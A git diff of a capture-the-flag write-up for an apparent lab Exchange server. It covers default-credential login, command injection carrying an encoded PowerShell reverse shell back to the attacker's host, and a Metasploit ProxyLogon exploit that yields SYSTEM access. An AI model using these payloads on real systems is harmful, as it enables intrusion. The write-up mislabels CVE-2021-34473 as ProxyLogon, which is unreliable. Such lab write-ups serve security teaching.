@@ -51,7 +51,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 There are 2 page.
 
-The port 443 running Outlook web login
+The port 443 running Outlook web login. The server might be a Microsoft Exchange Server.
 
 <figure><img src="../../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>
 
@@ -73,11 +73,11 @@ gobuster dir -u http://10.10.67.15/ -w /usr/share/wordlists/SecLists/Discovery/W
 echo "10.10.67.15    win-12ouo7a66m7.thm.local    thm.local" > /etc/hosts
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Try to insert the default credentials `admin:admin` and it's worked.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -105,7 +105,7 @@ hoaxshell -s 10.23.52.142 -p 9009 -i -H "Authorization"
 
 {% code title="Payload" overflow="wrap" %}
 ```powershell
-&xlog=BitlockerActiveMonitoringLogs');&xlog=BitlockerActiveMonitoringLogs');powershell -e JABzAD0AJwAxADAALgAyADMALgA1ADIALgAxADQAMgA6ADkAMAAwADkAJwA7ACQAaQA9ACcAYQA3ADAAMABhAGYAYwA5AC0ANgBjADgAOQA5AGIAZQA4AC0AMwA5AGIAZAA1ADYANgA4ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGEANwAwADAAYQBmAGMAOQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgBjADgAOQA5AGIAZQA4ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADMAOQBiAGQANQA2ADYAOAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A;Get-Content('C:;Get-Content('C:
+xlog=BitlockerActiveMonitoringLogs');powershell -e JABzAD0AJwAxADAALgAyADMALgA1ADIALgAxADQAMgA6ADkAMAAwADkAJwA7ACQAaQA9ACcAYQA3ADAAMABhAGYAYwA5AC0ANgBjADgAOQA5AGIAZQA4AC0AMwA5AGIAZAA1ADYANgA4ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGEANwAwADAAYQBmAGMAOQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgBjADgAOQA5AGIAZQA4ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADMAOQBiAGQANQA2ADYAOAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A;Get-Content('C:
 ```
 {% endcode %}
 
@@ -139,11 +139,64 @@ dev-infrastracture-team@thm.local
 
 
 
-### MS Exchange Outdated
+### Microsoft Exchange Outdated - CVE-2021-34473
 
-check the version of microsoft exchange installed
+Get the version of microsoft exchange installed:
+
+{% code overflow="wrap" %}
+```powershell
+ [System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.Transport.dll")
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 ```
- Get-Command Exsetup.exe | ForEach {$_.FileVersionInfo}
+15.02.0858.002
 ```
 
+As the note said, search for possible vulnerability for this version.&#x20;
+
+In March 2021, a version was released that contains no specific exploit for the vulnerability. However, an RCE vulnerability known as ProxyLogon was discovered in that month.
+
+Using this Nuclei templace we can see if the server is vulnerable to CVE-2021-34473 (ProxyLogon)
+
+{% embed url="https://github.com/kh4sh3i/ProxyShell/blob/main/proxyshell.yaml" %}
+
+```bash
+nuclei -u win-12ouo7a66m7.thm.local -t proxyshell.yaml
+```
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+This server is vulnerable, now search the exploit in Metasploit.
+
+```bash
+sudo service postgresql start && msfconsole
+search exchange
+```
+
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+This module can help us.
+
+```bash
+use exploit/windows/http/exchange_proxylogon_rce
+set RHOSTS 10.10.228.148
+set EMAIL dev-infrastracture-team@thm.local
+exploit
+```
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+In this way we have a meterpreter session as NT AUTHORITY\SYSTEM.
+
+Firstly, print the root flag.
+
+```powershell
+more C:\Users\Administrator\Documents\flag.txt
+```
+
+The next step could be dump the hash end enumeration all machine finding all necessary element for a futher persistance, pivoting or lateral movement.
+
+<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
